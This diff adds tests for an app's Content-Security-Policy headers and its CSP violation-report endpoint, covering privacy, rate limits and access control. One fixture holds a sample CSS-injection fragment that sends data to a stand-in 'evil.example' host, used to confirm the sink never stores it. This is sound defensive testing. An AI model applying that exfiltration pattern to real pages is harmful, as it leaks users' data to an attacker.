@@ -376,6 +376,105 @@ def test_health_remote_block_is_for_administrators_only(arx):
     assert TestClient(arx.app).get("/api/v1/health").json()["remote"]["enabled"] is True
 
 
+# ---------------------------------------------------------------- 5. CSP: report-only, the report sink, enforcing
+
+LEGACY = {"csp-report": {"document-uri": "https://example.test/arx/#/live?secret=1", "effective-directive": "style-src-elem",
+                         "violated-directive": "style-src-elem", "blocked-uri": "inline", "disposition": "report",
+                         "script-sample": "body{background:url(https://evil.example/x?leak=", "original-policy": "…"}}
+
+
+def test_csp_headers_report_only_then_enforced(arx):
+    from smplwise import remote_channel
+
+    h = arx.client.get("/arx/").headers
+    assert "style-src 'self' 'unsafe-inline'" in h["content-security-policy"]  # the enforced base policy
+    ro = h["content-security-policy-report-only"]
+    assert "style-src-elem 'self'" in ro and "style-src-attr 'unsafe-inline'" in ro and "'unsafe-inline'; style-src-elem" not in ro
+    assert "script-src 'self'" in ro and "unsafe-inline" not in ro.split("script-src")[1].split(";")[0]
+    for policy in (h["content-security-policy"], ro):
+        assert "report-uri /arx/api/v1/csp-report" in policy and "report-to arx-csp" in policy
+    assert h["reporting-endpoints"] == 'arx-csp="/arx/api/v1/csp-report"'
+    assert "content-security-policy-report-only" not in TestClient(arx.app).get("/api/v1/me").headers  # the local channel
+
+    admin = TestClient(arx.app)
+    assert admin.patch("/api/v1/settings", json={"remote.csp_enforce": "true"}).status_code == 200
+    assert remote_channel.csp_enforcing() is True
+    h = arx.client.get("/arx/").headers
+    assert "style-src-elem 'self'" in h["content-security-policy"] and "content-security-policy-report-only" not in h
+    assert admin.get("/api/v1/csp-reports").json()["mode"] == "enforce"
+    assert admin.patch("/api/v1/settings", json={"remote.csp_enforce": "maybe"}).status_code == 422
+    assert admin.patch("/api/v1/settings", json={"remote.csp_enforce": "false"}).status_code == 200
+    assert "content-security-policy-report-only" in arx.client.get("/arx/").headers
+    # the mode follows the database after a restore (the background pass re-reads it)
+    arx.setting("remote.csp_enforce", "true")
+    remote_channel.load_csp_mode(arx.db)
+    assert remote_channel.csp_enforcing() is True
+
+
+def test_a_route_keeps_its_own_csp_on_the_remote_channel(arx):
+    from fastapi.responses import PlainTextResponse
+
+    @arx.app.get("/api/v1/_test/sandboxed")
+    def sandboxed():  # like an evidence file (routers/cases.py: "sandbox; default-src 'none'")
+        return PlainTextResponse("x", headers={"Content-Security-Policy": "sandbox"})
+
+    arx.app.router.routes.insert(0, arx.app.router.routes.pop())  # ahead of the static files mount
+    r = arx.client.get("/arx/api/v1/_test/sandboxed")
+    policies = r.headers.get_list("content-security-policy")
+    assert "sandbox" in policies and any("frame-ancestors 'self'" in p for p in policies)
+
+
+def test_csp_report_sink_counts_without_content(arx):
+    sink = TestClient(arx.app)  # a browser's report: no cookie needed, no identity
+    r = sink.post("/arx/api/v1/csp-report", content=json.dumps(LEGACY), headers={"Content-Type": "application/csp-report"})
+    assert r.status_code == 204
+    batch = [{"type": "csp-violation", "age": 1, "url": "https://example.test/arx/?x=1", "body": {
+        "documentURL": "https://example.test/arx/?token=abc", "effectiveDirective": "img-src", "blockedURL": "https://tracker.example/p.gif?u=dana",
+        "disposition": "enforce", "sample": ""}}, {"type": "deprecation", "body": {}}]
+    assert sink.post("/arx/api/v1/csp-report", content=json.dumps(batch), headers={"Content-Type": "application/reports+json"}).status_code == 204
+    assert sink.post("/arx/api/v1/csp-report", content=json.dumps(LEGACY), headers={"Content-Type": "application/csp-report"}).status_code == 204
+    # a report posted with the Arx cookie and no fetch metadata is still accepted (the CSRF gate exempts the sink)
+    assert arx.client.post("/arx/api/v1/csp-report", content=json.dumps(LEGACY), headers={"Content-Type": "application/csp-report", "Origin": "null"}).status_code == 204
+
+    admin = TestClient(arx.app)
+    body = admin.get("/api/v1/csp-reports").json()
+    rows = {(r["disposition"], r["directive"], r["blocked"]): r["count"] for r in body["rows"]}
+    assert rows == {("report", "style-src-elem", "inline"): 3, ("enforce", "img-src", "https://tracker.example"): 1}
+    assert body["total"] == 4 and body["mode"] == "report_only" and "style-src-elem" in body["policy"]["report_only"]
+    with arx.db.connection(mode="read") as conn:
+        stored = json.dumps([dict(r) for r in conn.execute("SELECT * FROM csp_reports").fetchall()])
+    for secret in ("secret=1", "leak=", "token=abc", "u=dana", "p.gif", "evil.example"):
+        assert secret not in stored
+
+    # bounds: type, size, garbage, rate; remote channel only; the admin view needs system.configure
+    assert sink.post("/arx/api/v1/csp-report", content=b"x", headers={"Content-Type": "text/plain"}).status_code == 415
+    assert sink.post("/arx/api/v1/csp-report", content=b"{" + b" " * (17 * 1024) + b"}", headers={"Content-Type": "application/json"}).status_code == 413
+    assert sink.post("/arx/api/v1/csp-report", content=b"{not json", headers={"Content-Type": "application/json"}).status_code == 400
+    assert TestClient(arx.app).post("/api/v1/csp-report", content=json.dumps(LEGACY), headers={"Content-Type": "application/csp-report"}).status_code == 404
+    arx.bind("dev-dana", "viewer")
+    assert TestClient(arx.app, headers={"X-SW-Dev-User": "dana"}).get("/api/v1/csp-reports").status_code == 403
+    r = admin.delete("/api/v1/csp-reports")
+    assert r.status_code == 200 and r.json()["cleared"] == 2 and admin.get("/api/v1/csp-reports").json()["rows"] == []
+    assert arx.audit("remote.csp_reports_cleared")
+
+
+def test_csp_report_sink_is_rate_limited_and_row_bounded(arx, monkeypatch):
+    from smplwise.routers import remote
+
+    monkeypatch.setattr(remote, "CSP_IP_LIMITS", [(60.0, 3)])
+    sink = TestClient(arx.app)
+    codes = [sink.post("/arx/api/v1/csp-report", content=json.dumps(LEGACY), headers={"Content-Type": "application/csp-report", "CF-Connecting-IP": "198.51.100.3"}).status_code for _ in range(4)]
+    assert codes == [204, 204, 204, 429]
+    monkeypatch.setattr(remote, "CSP_IP_LIMITS", [(60.0, 1000)])
+    monkeypatch.setattr(remote, "CSP_ROWS_MAX", 3)
+    for i in range(6):
+        report = {"csp-report": {"effective-directive": "img-src", "blocked-uri": f"https://host{i}.example/a.png", "disposition": "report"}}
+        assert sink.post("/arx/api/v1/csp-report", content=json.dumps(report), headers={"Content-Type": "application/csp-report"}).status_code == 204
+    with arx.db.connection(mode="read") as conn:
+        rows = {(r["directive"], r["blocked"]): r["count"] for r in conn.execute("SELECT * FROM csp_reports").fetchall()}
+    assert len(rows) == 4 and rows[("other", "other")] == 4  # 3 distinct counters (inline + 2 hosts), the rest in "other"
+
+
 def test_sign_in_record_masks_the_address(arx):
     sign_in(browser(arx), arx, arx.viewer, **{"CF-Connecting-IP": "203.0.113.5", "CF-IPCountry": "IL"})
     with arx.db.connection(mode="read") as conn:
